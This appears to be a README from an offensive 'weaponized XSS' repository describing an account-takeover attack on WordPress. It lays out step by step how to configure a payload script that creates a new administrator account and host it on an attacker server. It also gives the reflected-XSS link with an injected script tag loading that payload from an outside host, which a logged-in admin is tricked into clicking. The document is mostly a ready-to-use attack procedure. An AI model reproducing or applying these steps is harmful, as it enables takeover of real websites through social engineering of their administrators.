# [ATO] Create New Admin User

## Test Environment

### Web Browsers (20250426)

* [x] Mozilla Firefox 137.0.2 (64-bit)
* [x] Google Chrome 135.0.7049.115 (64-bit)
* [x] Microsoft Edge 135.0.3179.98 (64-bit)

## Exploitation Steps

1. [setup exploit] change payload variable values (`createAdminAccWP.js`)

    `newAccUser` - username of the user account to be created

    `newAccPass` - password of the user account to be created (**NOTE**: minimum password length is 9 characters)

    `newAccEmail` - email of the user account to be created

    `wpRoot` - path to WordPress installation on the target system (e.g. `"/wordpress"`)

2. [setup exploit] setup web server (to serve the payload)

3. [social engineering attack] victim user (with administrative privileges) logs in

    http://192.168.5.10/wp-login.php

4. [social engineering attack] victim user clicks link

    ```
    http://192.168.5.10/rxss.php?q=<script src=http://192.168.5.5/createAdminAccWP.js></script>
    ```

    * **NOTES**:
      * `192.168.5.10` - target WordPress site
      * `192.168.5.5` - web server hosting the payload

5. [post exploit] attacker logs into target WordPress site using specified credentials

    http://192.168.5.10/wp-login.php

## Screenshot

* **NOTE**: the screenshot covers steps 1 to 4 from the "Exploitation Steps" chapter

<p align="center">
  <kbd>
    <picture>
      <source media="" srcset="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/CreateNewAdmin/screenshots/WordPress_-_create_new_admin_-_1-1.png">
      <img src="https://github.com/lighthouseitsecurity/weaponizedXSS/raw/main/CMS/WordPress/CreateNewAdmin/screenshots/WordPress_-_create_new_admin_-_1-1.png">
    </picture>
  </kbd>
</p>

## Video

https://github.com/user-attachments/assets/0e60144c-02c9-4e71-a1cf-1241a2990d3f
